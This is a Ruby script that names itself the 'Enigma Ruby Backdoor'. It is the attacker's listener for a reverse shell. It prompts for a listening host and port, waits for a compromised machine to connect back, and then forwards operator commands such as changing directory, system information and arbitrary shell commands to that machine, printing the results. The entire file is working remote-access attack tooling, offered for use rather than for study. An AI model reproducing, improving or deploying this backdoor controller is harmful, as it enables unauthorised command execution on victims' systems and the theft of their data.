#!/usr/bin/ruby
#-*- coding:utf-8 -*-

require 'socket'


def main()
  banner = '''
  ▓█████  ███▄    █  ██▓  ▄████  ███▄ ▄███▓ ▄▄▄
  ▓█   ▀  ██ ▀█   █ ▓██▒ ██▒ ▀█▒▓██▒▀█▀ ██▒▒████▄
  ▒███   ▓██  ▀█ ██▒▒██▒▒██░▄▄▄░▓██    ▓██░▒██  ▀█▄
  ▒▓█  ▄ ▓██▒  ▐▌██▒░██░░▓█  ██▓▒██    ▒██ ░██▄▄▄▄██
  ░▒████▒▒██░   ▓██░░██░░▒▓███▀▒▒██▒   ░██▒ ▓█   ▓██▒
  ░░ ▒░ ░░ ▒░   ▒ ▒ ░▓   ░▒   ▒ ░ ▒░   ░  ░ ▒▒   ▓▒█░
   ░ ░  ░░ ░░   ░ ▒░ ▒ ░  ░   ░ ░  ░      ░  ▒   ▒▒ ░
     ░      ░   ░ ░  ▒ ░░ ░   ░ ░      ░     ░   ▒
     ░  ░         ░  ░        ░        ░         ░  ░

                Enigma Ruby Backdoor
                Author : Dxvistxr - Unamed
                Date : 2019
                Github : https://github.com/Dxvistxr
  '''
  system("clear")
  system("clear")
  puts("\033[1;91m#{banner}")

  print("\033[1;91m[\033[1;92m+\033[1;91m] Enter Your LHOST :> \033[1;97m")
  listener_host = gets.chomp
  print("\033[1;91m[\033[1;92m+\033[1;91m] Enter Your LPORT :> \033[1;97m")
  listener_port = gets.chomp

  server = TCPServer.new(listener_host,listener_port)

  puts "\033[1;91m[\033[1;94m*\033[1;91m] Listening on #{listener_host}:#{listener_port}"
  puts "\033[1;91m[\033[1;93m*\033[1;91m] Waiting Connection..."

  client = server.accept
  data = client.recv(4096)
  print($data,"\n")

  while true
    begin
      print "\033[1;91m[~\033[1;97mEnigma\033[1;91m@\033[1;97mShell\033[1;91m~]: \033[1;97m"
      command = gets.chomp

      if command =="quit"
        server.close()
        break

      elsif command =="help"
        puts("\033[1;91m[\033[1;92m+\033[1;91m] Help Main \033[1;91m[\033[1;92m+\033[1;91m]")
        puts("\033[1;91m[\033[1;92m+\033[1;91m] command  descriptions ")
        puts("\033[1;91m[\033[1;92m+\033[1;91m] -------  ------------ ")
        puts("\033[1;91m[\033[1;92m+\033[1;91m] ipgeo       IPGeo     ")
        puts("\033[1;91m[\033[1;92m+\033[1;91m] sysinfo     Get SystemInfo")
        puts("\033[1;91m[\033[1;92m+\033[1;91m] cd <path>   Change Dirrectory")
        puts("\033[1;91m[\033[1;92m+\033[1;91m] quit        Exiting Backdoor")

      elsif command.start_with? "cd"
        arg = command.split(' ')[1]
        if arg ==""
          puts "\033[1;91m[!] cd arguments invalid"

        else
          client.puts(command)
          data = client.recv(65355)
          puts(data)

        end

      elsif command ==""
        puts "\033[1;91m[!] Command Not Sent Error"

      else
        client.puts(command)
        data = client.recv(65355)
        puts(data)

      end

    rescue SignalException #is control D
      puts "Error KeyBoardInterrupt"
    rescue Exception # exception de input
      puts "Exception !"
    end
  end
end



if __FILE__ == $0
  main()
end
